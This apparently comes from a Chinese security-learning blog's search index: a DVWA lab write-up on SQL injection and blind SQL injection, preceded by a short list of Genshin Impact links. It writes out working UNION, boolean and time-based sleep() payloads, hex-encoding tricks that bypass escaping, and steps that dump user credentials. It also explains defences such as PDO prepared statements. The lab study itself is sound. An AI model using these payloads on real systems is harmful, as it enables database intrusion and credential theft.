<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Genshin</title>
    <url>/2022/09/01/Genshin/</url>
    <content><![CDATA[<center>woc，原</center>

<span id="more"></span>

<h2 id="Wiki"><a href="#Wiki" class="headerlink" title="Wiki"></a>Wiki</h2><p><a href="https://wiki.biligame.com/ys/%E9%A6%96%E9%A1%B5">原神WIKI</a></p>
<p><a href="https://ambr.top/chs">Project Amber</a></p>
<p><a href="https://genshin.honeyhunterworld.com/?lang=CHS">Honey Impact - Genshin Impact Database</a></p>
<h2 id="地图"><a href="#地图" class="headerlink" title="地图"></a>地图</h2><p><a href="https://webstatic.mihoyo.com/app/ys-map-cn/index.html?bbs_presentation_style=no_header&ts=1606133548270#/map/2?shown_types=&center=1877.00,1300.00&zoom=-4.00">提瓦特大地图 - 观测枢</a></p>
<h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><p><a href="https://genshin.mingyulab.com/">原魔计算器</a></p>
<p><a href="https://bbs.nga.cn/read.php?tid=28172053&rand=430">圣遗物扫描工具 ‘天目’</a></p>
]]></content>
      <tags>
        <tag>fun</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA</title>
    <url>/2022/08/30/DVWA/</url>
    <content><![CDATA[<center>DVWA靶场漏洞学习及补充</center>

<span id="more"></span>

<h1 id="1-SQL注入（SQL-Injection）"><a href="#1-SQL注入（SQL-Injection）" class="headerlink" title="1.SQL注入（SQL Injection）"></a>1.SQL注入（SQL Injection）</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><a href="https://blog.csdn.net/qq_44159028/article/details/114325805">SQL注入详解</a><br>结构化查询语言（Structured Query Language，SQL），是一种特殊的编程语言，用于数据库中的标准数据查询语言。</p>
<p>SQL注入（SQL Injection）是一种常见的Web安全漏洞，主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱库、被删除、甚至整个服务器权限）。</p>
<p>即：注入产生的原因是后台服务器接收相关参数未经过滤直接带入数据库查询</p>
<blockquote>
<p>手工注入（非盲注）的步骤。</p>
<p>1.判断是否存在注入，注入是字符型还是数字型</p>
<p>（字符型注入和数字型注入和的区别在于所查询的数据类型不同）</p>
<p>2.猜解SQL查询语句中的字段数</p>
<p>3.确定显示的字段顺序</p>
<p>4.获取当前数据库</p>
<p>5.获取数据库中的表</p>
<p>6.获取表中的字段名</p>
<p>7.下载数据</p>
</blockquote>
<h2 id="如何防御SQL注入"><a href="#如何防御SQL注入" class="headerlink" title="如何防御SQL注入"></a>如何防御SQL注入</h2><p>代码层面：</p>
<p>1.对输入进行严格的转义和过滤</p>
<p>2.使用参数化（Parameterized）查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">参数化查询（Parameterized Query或Parameterized Statement）是指在设计与数据库链接并访问数据时，在需要填入数值或数据的地方，使用参数（Parameter）来给值，这个方法已被视为最有效可预防SQL注入攻击的攻击手法的防御方式。</span><br></pre></td></tr></table></figure>

<p>网络层面：</p>
<p>1.通过WAF设备启用防SQL Inject注入策略（或类似防护系统）</p>
<p>2.云端防护（如阿里云盾）</p>
<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>输入</p>
<p><img data-src="https://img-blog.csdnimg.cn/405b2a4bd9f145b388d89493d5c1a036.png" alt="在这里插入图片描述"></p>
<p>查看源代码可知这一关对于表单输入ID没有进行任何过滤</p>
<h3 id="1-测试是否含有SQL注入"><a href="#1-测试是否含有SQL注入" class="headerlink" title="1.测试是否含有SQL注入"></a>1.测试是否含有SQL注入</h3><p>输入1</p>
<p><img data-src="https://img-blog.csdnimg.cn/68560507789d48328ce2dec1efd5f122.png" alt="1.1"></p>
<p>输入<code>1’ and 1=1</code></p>
<p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’’ at line 1</p>
<p><img data-src="https://img-blog.csdnimg.cn/2c8af2f32ecf4fca8f53c5da6035c1ad.png" alt="1.2"></p>
<p>注入点判断，如上图可知受到单引号闭合影响</p>
<p>把SQL语句后续语句全部注释掉不执行，在判断语句后加 <code>#</code> 或者 <code>--+</code> 即可</p>
<p>其中<code>--+</code>中的<code>+</code>代表空格，但是我使用<code>--+</code>会报错，不如<code>-- </code>空格</p>
<p>（当使用get方式传参的时候，–+就是YYDS了，#会被当作浏览器自身操作)</p>
<blockquote>
<p> &#96;1’ and 1&#x3D;1#</p>
<p> <img data-src="https://img-blog.csdnimg.cn/20a683c84db44c0d886d6091d62263b2.png" alt="在这里插入图片描述"></p>
</blockquote>
<blockquote>
<p><code>1&#39; and 1=1--</code>（后无空格）报错</p>
<p><code>1&#39; and 1=1-- </code>（后有空格）</p>
<p><img data-src="https://img-blog.csdnimg.cn/bfb2684e31e84fabb14158afa26b01b8.png" alt="在这里插入图片描述"></p>
</blockquote>
<blockquote>
<p><code>1’ and 1=1--+</code>（后有&#x2F;无空格）报错</p>
</blockquote>
<h3 id="2-找字段"><a href="#2-找字段" class="headerlink" title="2.找字段"></a>2.找字段</h3><blockquote>
<p>找出注入点以及符号问题，然后通过1’ and 1&#x3D;1 order by 1#判断字段(就是正常查询时可以显示用户的几条信息)</p>
<p><code>1’ and 1=1 order by 1#</code></p>
<p><img data-src="https://img-blog.csdnimg.cn/731b054cf188438685ea4346c4dcce06.png" alt="在这里插入图片描述"></p>
<p>group by， order by 后面跟数字，指的是 select 后面选择的列（属性），1 代表第一个列（属性)，依次类推。</p>
</blockquote>
<blockquote>
<p><code> 1&#39; and 1=1 order by 3#</code></p>
<p>Unknown column ‘3’ in ‘order clause’</p>
<p><img data-src="https://img-blog.csdnimg.cn/6d21e9ef26354fecb13fc7d5a49d0e48.png" alt="在这里插入图片描述"></p>
<p>3返回错误那么就有2个字段，2即为分界点</p>
</blockquote>
<h3 id="3-找注入点"><a href="#3-找注入点" class="headerlink" title="3.找注入点"></a>3.找注入点</h3><blockquote>
<p> 找出字段之后（找字段的作用是为了后续报错，看会有几个位置可以报错）</p>
<p> 看哪个位置输出什么</p>
</blockquote>
<blockquote>
<p><code> 1&#39; union select 1,2#</code></p>
<p><img data-src="https://img-blog.csdnimg.cn/d968197875cc469ab7068f5a014ef579.png" alt="在这里插入图片描述"></p>
</blockquote>
<blockquote>
<p> <code>1&#39; union select 1,2,3#</code></p>
<p> <img data-src="https://img-blog.csdnimg.cn/c083a6f4d8354d58a63f2f46997a27f9.png" alt="在这里插入图片描述"></p>
</blockquote>
<blockquote>
<p> <code>-1&#39; union select 1,2#</code></p>
<p> sql语句获取id &#x3D; xx的数据，这里我们让id &#x3D; -1，条件不成立，便不会显示多余的东西</p>
<p> 使用union（联合）来加入第二个select语句</p>
<p> 1，2便会按照列的的顺序依次列出</p>
<p> <img data-src="https://img-blog.csdnimg.cn/fb2bccc8c7f547b986d1aca0bb3494de.png" alt="在这里插入图片描述"></p>
</blockquote>
<h3 id="常见参数"><a href="#常见参数" class="headerlink" title="常见参数"></a>常见参数</h3><p>在MYSQL5.0以上版本中存在自带数据库information_schema，他是一个存储所有数据库名，表名，列名的数据库，相当于可以通过查询此库获得相应信息。（没有的话只能靠猜，暴力破解）</p>
<blockquote>
<p>information_schema.tables：记录所有表名信息的表</p>
<p>information_schema.columns：记录所有列名信息的表</p>
<p>table_name：表名</p>
<p>column_name：列名</p>
<p>table_schema：数据库名</p>
<p>user() 查看当前MySQL登录的用户名</p>
<p>database() 查看当前使用MySQL数据库名</p>
<p>version() 查看当前MySQL版本</p>
</blockquote>
<h3 id="4-找数据"><a href="#4-找数据" class="headerlink" title="4.找数据"></a>4.找数据</h3><blockquote>
<p> 顺序首先是数据库名，表名，列名，之后是具体信息</p>
<p> <code>-1&#39; union select 1,database()#</code></p>
<p> <img data-src="https://img-blog.csdnimg.cn/fd1474f02ecb47a98d98cb5c9cb5455c.png" alt="在这里插入图片描述"></p>
</blockquote>
<blockquote>
<p> 符号“.”代表下一级</p>
<p> <strong>表名</strong></p>
<p> <code>-1&#39; union select 1,table_name from information_schema.tables where table_schema=&#39;dvwa&#39;#</code></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">information_schema数据库是MySQL自带的，它提供了访问数据库元数据的方式。什么是元数据呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。</span><br></pre></td></tr></table></figure>

<p> <img data-src="https://img-blog.csdnimg.cn/d6b9701ac4004104a0c370ea61aa15a5.png" alt="在这里插入图片描述"></p>
<p> 可以用group_concat把表名拼接起来</p>
<p> <code>-1&#39; union select 1, group_concat(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39;#</code></p>
<p> <img data-src="https://img-blog.csdnimg.cn/efe8633f8aa44d5280ec3ac9f2a5496d.png" alt="在这里插入图片描述"></p>
</blockquote>
<blockquote>
<p> <strong>列名</strong></p>
<p> <code> -1&#39; union select  1, group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;#</code></p>
<p> 当发现有重复列名时，因为有多个数据库的列名可能重复可以加一个判定table_schema&#x3D;”dvwa”</p>
<p> <code> -1&#39; union select  1, group_concat(column_name) from information_schema.columns where table_schema=&quot;dvwa&quot; and table_name=&#39;users&#39;#</code></p>
<p> <img data-src="https://img-blog.csdnimg.cn/a92f4e5f4398429ab125d82d7f627a09.png" alt="在这里插入图片描述"></p>
</blockquote>
<blockquote>
<p> 查账号密码</p>
<p> <code> -1&#39; union select group_concat(user_id,first_name),group_concat(user,password) from users#</code></p>
<p> <img data-src="https://img-blog.csdnimg.cn/b1d23595f1bb499abecb70dc6dc9f06d.png" alt="在这里插入图片描述"></p>
<p> 密码是通过MD5加密，解密后获得例如user_id为1的密码为password</p>
<table>
<thead>
<tr>
<th>user_id</th>
<th>first_name</th>
<th>user</th>
<th>password</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>admin</td>
<td>admin</td>
<td>5f4dcc3b5aa765d61d8327deb882cf99 &#x3D;&gt; password</td>
</tr>
</tbody></table>
</blockquote>
<p>如果出现<code>Illegal mix of collations for operation &#39;UNION&#39;报错</code>，可以用16进制来实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select group_concat(hex(user_id),hex(first_name)),group_concat(hex(user),hex(password)) from users#</span><br></pre></td></tr></table></figure>

<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>这里不再让用户输入id，而是使用下拉框选择参数，但是可以使用burpsuite抓包修改post的参数</p>
<p><img data-src="https://img-blog.csdnimg.cn/5d5180af9ca34780a597cc70c64ad49b.png" alt="在这里插入图片描述"></p>
<h3 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h3><p>proxy-open brower(intercept off)-submit(intercept on)-抓包如下</p>
<p><img data-src="https://img-blog.csdnimg.cn/079879da23ee4bd7a87a82aff14126bb.png" alt="在这里插入图片描述"></p>
<p>修改<code>id=1 or 1=1#</code></p>
<p>结果如下</p>
<p><img data-src="https://img-blog.csdnimg.cn/dfbaffcab0b548f981ede3a487d184a7.png" alt="在这里插入图片描述"></p>
<p>然后如Low，操作如下</p>
<p><code>id=1 and 1=1  order by 3#</code> &#x3D;&gt;Unknown column ‘3’ in ‘order clause’</p>
<p><code>id=1 union select 1,database()#</code> &#x3D;&gt;</p>
<p><img data-src="https://img-blog.csdnimg.cn/1c6c0085564f45a9b997121344ea2da9.png" alt="在这里插入图片描述"></p>
<h3 id="mysqli-real-escape-string"><a href="#mysqli-real-escape-string" class="headerlink" title="mysqli-real-escape-string()"></a>mysqli-real-escape-string()</h3><p>当查询表名时出现如下错误</p>
<p><code>id=1 union select 1,table_name from information_schema.tables where table_schema=&#39;dvwa&#39;#</code></p>
<p>&#x3D;&gt;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘&#39;dvwa&#39;#’ at line 1</p>
<p>view resource看到如下PHP</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$id</span>);</span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">    <span class="comment">//无关省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.w3school.com.cn/php/func_mysql_real_escape_string.asp">mysqli-real-escape-string</a> </p>
<p>其中<code>$ id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id);</code></p>
<p>mysqli_real_escape_string() 函数转义在 SQL 语句中使用的字符串中的特殊字符。 </p>
<p>利用mysql_real_escape_string函数对特殊符号<code>\x00,\n,\r,\,’,”,\x1a</code>进行转义，例如单引号被转义成<code>\&#39;</code></p>
<p>（第一个参数是mysql连接，第二个是要转义的字符串）</p>
<p> <a href="https://baike.baidu.com/item/%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/86397">转义字符</a> </p>
<p> <a href="https://blog.csdn.net/weixin_39598501/article/details/113272312">绕过魔术引号</a></p>
<p>此时需要将单引号之间的字符串转16进制后替换（在前面加上0x）</p>
<p><a href="http://www.ku51.net/ox2str/">字符串转十六进制</a></p>
<p><code>id=1 union select 1,table_name from information_schema.tables where table_schema=0x64767761#</code></p>
<p>这里会出现<code>Illegal mix of collations for operation &#39;UNION&#39;</code>报错，因为后台数据库的排序规则，数据库默认排序规则是utf8_unicode_ci，把<code>first_name, last_name</code>改成<code>utf8_general_ci</code>即可。</p>
<p><img data-src="https://img-blog.csdnimg.cn/1b6ef2aad8c54b429e0994430d1b53a2.png" alt="在这里插入图片描述"></p>
<p><code>id=-1 union select  1, group_concat(column_name) from information_schema.columns where table_name=0x7573657273#</code>（这里限定表名的话字段名就会更精确）</p>
<p><img data-src="https://img-blog.csdnimg.cn/3f728923b57d42d69d692b3477e1f148.png" alt="在这里插入图片描述"></p>
<p><code>id=-1 union select group_concat(user_id,first_name),group_concat(user,password) from users#</code><img data-src="https://img-blog.csdnimg.cn/6d9993e8b9c64e4c8ef62d356909ce41.png" alt="在这里插入图片描述"></p>
<p>MD5解密，admin，password</p>
<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>这里在其他界面进行修改操作而非在原页面，对于手工注入来说基本没啥区别，这一关的意义主要是为了防止SQLmap注入（但是后面会介绍如何注入）</p>
<p><img data-src="https://img-blog.csdnimg.cn/2f1fc1bd54a5455bb0d66dfff75d9ac0.png" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/e521c99878c9429ba6c3968aad0088f9.png" alt="在这里插入图片描述"></p>
<p>操作如Low</p>
<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>View Source</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">SQL Injection Source</span><br><span class="line">vulnerabilities/sqli/source/impossible.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>( <span class="variable">$id</span> )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::<span class="variable constant_">PARAM_INT</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">rowCount</span>() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            <span class="variable">$first</span> = <span class="variable">$row</span>[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line">            <span class="variable">$last</span>  = <span class="variable">$row</span>[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRF token机制的加入了进一步提高了安全性。</p>
</blockquote>
<h1 id="2-SQL盲注（SQL-Injection-Blind-）"><a href="#2-SQL盲注（SQL-Injection-Blind-）" class="headerlink" title="2. SQL盲注（SQL Injection(Blind)）"></a>2. SQL盲注（SQL Injection(Blind)）</h1><p>与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。</p>
<blockquote>
<p>盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注</p>
</blockquote>
<p>手工盲注的步骤：</p>
<p>1.判断是否存在注入，注入是字符型还是数字型</p>
<p>2.猜解当前数据库名</p>
<p>3.猜解数据库中的表名</p>
<p>4.猜解表中的字段名</p>
<p>5.猜解数据</p>
<h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><p>结果只有两种显示</p>
<p><img data-src="https://img-blog.csdnimg.cn/0199e72d89274634b346dc336eb1c6e3.png" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/7a889e1b421448e190a291e78b25d023.png" alt="在这里插入图片描述"></p>
<h3 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h3><h4 id="1-判断是否存在注入，注入是字符型还是数字型"><a href="#1-判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="1.判断是否存在注入，注入是字符型还是数字型"></a>1.判断是否存在注入，注入是字符型还是数字型</h4><blockquote>
<p>数字型注入如：select email from member where id&#x3D;$id</p>
<p>如果输入1 or 1&#x3D;1则为永真，即select email from member where id&#x3D;1 or 1&#x3D;1 </p>
</blockquote>
<blockquote>
<p>字符型注入如：select email from member where id&#x3D;’$id’</p>
<p>如果输入1 or 1&#x3D;1，即select email from member where id&#x3D;’1 or 1&#x3D;1，此时会报错</p>
<p>此时可以输入’ or 1&#x3D;1 #，select email from member where id&#x3D;’’ or 1&#x3D;1 #’</p>
</blockquote>
<p>输入1’ and 1&#x3D;1#</p>
<p><img data-src="https://img-blog.csdnimg.cn/edd6f23e582a49e1838bd5360d5b8899.png" alt="在这里插入图片描述"></p>
<p>说明存在字符型的SQL盲注</p>
<h4 id="2-猜解当前数据库名"><a href="#2-猜解当前数据库名" class="headerlink" title="2.猜解当前数据库名"></a>2.猜解当前数据库名</h4><p>方法大概就是先判断长度，再通过缩小ascii码范围判断每个字符。</p>
<p>输入<code>1&#39; and length(database())=4#</code></p>
<p><img data-src="https://img-blog.csdnimg.cn/f8f2f4abb7dd456592786db5dea1e930.png" alt="在这里插入图片描述"></p>
<p>说明数据库名长度为4。</p>
<p>然后采用二分法猜解数据库名</p>
<p>输入1’ and ascii(substr(database(),1,1))&gt;97 #</p>
<blockquote>
<p>[substr</p>
<p><a href="http://www.yiidian.com/sql/substr-function-in-sql.html"></a><br>substr，SQL数据库操作函数 <code>substr(strings|express,m,[n])</code></p>
<p>m：从第m个字符开始截取；n：截取后字符串长度为n</p>
</blockquote>
<p><img data-src="https://img-blog.csdnimg.cn/c26cebecbece4e17b07b64f99caf6cb4.png" alt="在这里插入图片描述"></p>
<p>显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）</p>
<p>输入1’ and ascii(substr(database(),1,1))&lt;122 #</p>
<p><img data-src="https://img-blog.csdnimg.cn/3adbf05ab3da4074bc77874573b27897.png" alt="在这里插入图片描述"></p>
<p>显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；</p>
<p>重复上述步骤，就可以猜解出完整的数据库名（dvwa）了（就嗯猜)</p>
<h4 id="3-猜解数据库中的表名"><a href="#3-猜解数据库中的表名" class="headerlink" title="3.猜解数据库中的表名"></a>3.猜解数据库中的表名</h4><p>先猜表的数量</p>
<p>输入<code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())=2#</code></p>
<p><img data-src="https://img-blog.csdnimg.cn/16a09022b9cb4122a8e0cf11b53b7113.png" alt="在这里插入图片描述"></p>
<p>说明数据库中共有两个表</p>
<p>然后重复类似猜数据库名的步骤</p>
<p>猜表名长度</p>
<p>1’ and (select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit 1,1)&#x3D;5 #</p>
<blockquote>
<p>limit 0,1, 从你的表中的第0个数据开始，只读取一个；<br>这里substr将每行的字符串从第一个位置开始截取（即该行的字符串）</p>
</blockquote>
<p>重复直到猜出表长度（为什么不用大于小于）</p>
<p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;97 # 显示存在</p>
<p>重复直到猜出表名</p>
<h4 id="4-猜解表中的字段名"><a href="#4-猜解表中的字段名" class="headerlink" title="4.猜解表中的字段名"></a>4.猜解表中的字段名</h4><p>首先猜解表中字段的数量</p>
<p>1’ and (select count(column_name) from information_schema.columns where table_name&#x3D;’users’)&#x3D;1 #</p>
<p>接着挨个猜解字段长度</p>
<p>1’ and (select length(column_name) from information_schema.columns where table_name&#x3D; ‘users’ limit 3,1))&#x3D;4 #</p>
<p>然后猜字段名</p>
<p>1’ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D; ‘users’ limit 0,1),1,1))&gt;97 #</p>
<h4 id="5-猜解表中的数据"><a href="#5-猜解表中的数据" class="headerlink" title="5.猜解表中的数据"></a>5.猜解表中的数据</h4><p>如上操作，就嗯猜</p>
<h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><blockquote>
<p>时间型盲注 </p>
<p>当我们不管如何输入，页面信息都没有任何变化，不提供给攻击者任何有用的信息的时候，这时候就只能尝试时间型盲注。</p>
<p>时间型盲注就是在布尔型盲注的基础上增加了时间的判断。</p>
<p>时间盲注的关键函数是if(),sleep()，通过对布尔型注入的判断，辅以时间延迟的方法，来最终获得注入结果。</p>
</blockquote>
<blockquote>
<p>时间盲注多与if(expr1,expr2,expr3)结合使用，这个语句的含义是若expr1为true，则if返回值为expr2，反之为expr3。</p>
</blockquote>
<h4 id="1-判断是否存在注入，注入是字符型还是数字型-1"><a href="#1-判断是否存在注入，注入是字符型还是数字型-1" class="headerlink" title="1.判断是否存在注入，注入是字符型还是数字型"></a>1.判断是否存在注入，注入是字符型还是数字型</h4><p>1’ and sleep(5) # 延迟</p>
<p>1 and sleep(5) #无延迟</p>
<p>说明存在字符型的基于时间的盲注</p>
<h4 id="2-猜解当前数据库名-1"><a href="#2-猜解当前数据库名-1" class="headerlink" title="2.猜解当前数据库名"></a>2.猜解当前数据库名</h4><p>1’ and if(length(database())&#x3D;1,sleep(5),1) #</p>
<p>无延迟返回1，说明length(database())&#x3D;1为false</p>
<p>1’ and if(length(database())&#x3D;4,sleep(5),1)#</p>
<p>有延迟返回0，说明length(database())&#x3D;4为true</p>
<p>之后逻辑如布尔盲注</p>
<p>猜数据库名</p>
<p>1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟</p>
<h4 id="3-猜解数据库中的表名-1"><a href="#3-猜解数据库中的表名-1" class="headerlink" title="3.猜解数据库中的表名"></a>3.猜解数据库中的表名</h4><p>猜表数</p>
<p>1’ and if((select count(table_name) from information_schema.tables where table_schema&#x3D;database() )&#x3D;2,sleep(2),1)#</p>
<p>猜表名</p>
<p>1’ and if((select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit 1,1)&#x3D;5,sleep(2),1) # </p>
<p>1’ and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1,1))&#x3D;117,sleep(2),1) #</p>
<h4 id="4-猜解表中的字段名-1"><a href="#4-猜解表中的字段名-1" class="headerlink" title="4.猜解表中的字段名"></a>4.猜解表中的字段名</h4><p>猜字段数</p>
<p>1’ and if((select count(column_name) from information_schema.columns where table_name&#x3D; ‘users’ and table_schema&#x3D;database())&#x3D;8,sleep(2),1)#</p>
<p>猜字段名</p>
<p>1’ and if((select length(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D; ‘users’ limit 3,1)&#x3D;4,sleep(2),1) #</p>
<p>1’ and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D; ‘users’ limit 3,1),1,1)),sleep(2),1)&#x3D; 117#</p>
<h4 id="5-猜解表中的数据-1"><a href="#5-猜解表中的数据-1" class="headerlink" title="5.猜解表中的数据"></a>5.猜解表中的数据</h4><p>1’ and if((select count(user) from users)&#x3D;5,sleep(2),1)#<br>1’ and if((select length(user) from users limit 0,1)&#x3D;5,sleep(2),1)#<br>1’ and if(ascii(substr((select user from users limit 0,1),1,1))&#x3D;97,sleep(2),1)#</p>
<p>嗯猜</p>
<h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><p>转义+盲注</p>
<p>步骤如SQL Injection Medium+布尔盲注，如</p>
<h3 id="基于布尔的盲注-1"><a href="#基于布尔的盲注-1" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h3><p>抓包改参数id&#x3D;1 and length(database())&#x3D;4 #，显示存在，说明数据库名的长度为4个字符；</p>
<p>id&#x3D;1 and length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1))&#x3D;9 #，显示存在，说明数据中的第一个表名长度为9个字符；</p>
<p>id&#x3D;1 and (select count(column_name) from information_schema.columns where table_name&#x3D; 0×7573657273)&#x3D;8 #</p>
<p>（0×7573657273为users的16进制），显示存在，说明uers表有8个字段。</p>
<h3 id="基于时间的盲注-1"><a href="#基于时间的盲注-1" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p>抓包改参数id&#x3D;1 and if(length(database())&#x3D;4,sleep(5),1) #，明显延迟，说明数据库名的长度为4个字符；</p>
<p>抓包改参数id&#x3D;1 and if(length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1))&#x3D;9,sleep(5),1) #，明显延迟，说明数据中的第一个表名长度为9个字符；</p>
<p>抓包改参数id&#x3D;1 and if((select count(column_name) from information_schema.columns where table_name&#x3D;0×7573657273 )&#x3D;8,sleep(5),1) #，明显延迟，说明uers表有8个字段。</p>
